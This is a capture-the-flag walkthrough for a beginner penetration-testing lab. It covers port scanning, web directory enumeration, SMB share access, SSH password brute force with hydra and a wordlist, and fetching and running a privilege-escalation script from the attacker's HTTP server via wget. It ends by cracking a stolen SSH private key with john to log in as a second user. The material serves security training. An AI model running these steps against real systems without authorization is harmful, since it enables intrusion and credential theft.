---
description: https://tryhackme.com/room/basicpentestingjt
---

# Basic Pentesting

Wrap-UP:

1.  use **nmap** to scan the open ports

    ```
    nmap -sV <ip>
    ```
2. use **gobuster** to enumerate hidden folders in web server\
   Syntax: gobuster -u \[HTTP://ip] -w \[wordlist]\
   gobuster dir -u http://ip -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \

3.  use **Enum4Linux** to scan the whole system\
    Syntax: Enum4linux -a \[IP]\
    Instead of grabbing user information from Enum4Linux output, we can scan smb to get information:\
    Syntax: smbclient \[IP]//\[smb share] -U \[username, if applicable]\
    ![](<../.gitbook/assets/image (5) (1) (1) (1) (1) (1).png>)\
    Connect:\


    ```
    smbclient //<IP>/anonymous

    staff.txt:
    Announcement to staff:

    PLEASE do not upload non-work-related items to this share. I know it's all in fun, but
    this is how mistakes happen. (This means you too, Jan!)

    -Kay
    ```
4.  Use **hydra** to brutal-forcing the password:\
    Syntax: hydra -l \[username] -P \[wordlist] \[IP] \[service]\
    OR\
    Syntax: hydra -l \[username] -P \[wordlist] \[service://IP]\
    \


    ```
    hydra -l jan -P /usr/share/wordlists/rockyou.txt <IP> ssh


    ```
5.  login with the credentials get from previous steps.\


    ```
    cat /etc/passwd

    SSH into the machine using the discovered credentials (user: jan):

    ssh jan@<target-ip-address>
    ```
6.  Use **privilege escalation tool like LinEnum or Linpeas**\
    transport the linpeas:\
    scp \[linenum.sh] \[user@ip]\
    use linenum.sh to scan:\
    ./linenum.sh | tee long.txt\
    \


    Start a Python HTTP server to transfer scripts from your local machine to the target:

    > python3 -m http.server — bind \<your-tun0-ip> 8000
    >
    > \
    > ![](<../.gitbook/assets/image (8) (1) (1) (1).png>)\
    >
    >
    > On the target machine, download the script:
    >
    > > wget http://\<your-tun0-ip>:8000/\<script-file-name>\
    > > \
    > > \
    > >
    > >
    > > Make the script executable and run it:
    > >
    > > > chmod +x \<script-name>\
    > > > ./\<script-name>
    > >
    > > \
    > > ![](<../.gitbook/assets/image (9) (1) (1) (1).png>)\
    > > \
    > > chmod 600 id\_rsa
7. From task 6 we can find the id\_rsa hash key for kay to login. Copy the file to the local machine and use john to crack the hash file.\
   Syntax: **ssh2john** \[file] > hash.txt\
   &#x20;    ssh2john id\_rsa > john-pass\
   Crack the hash file password:\
   Syntax: john hash.txt — wordlist=\[wordlist]\
   john — wordlist=/usr/share/wordlists/rockyou.txt john-pass\
   ![](<../.gitbook/assets/image (11) (1) (1).png>)
8.  ssh to the new user with cracked rsa\_id\


    SSH into user `kay` using the cracked key:

    > ssh -i id\_rsa kay@\<target-ip>\
    > ![](<../.gitbook/assets/image (12) (1).png>)\
    > \
    > ![](<../.gitbook/assets/image (13).png>)
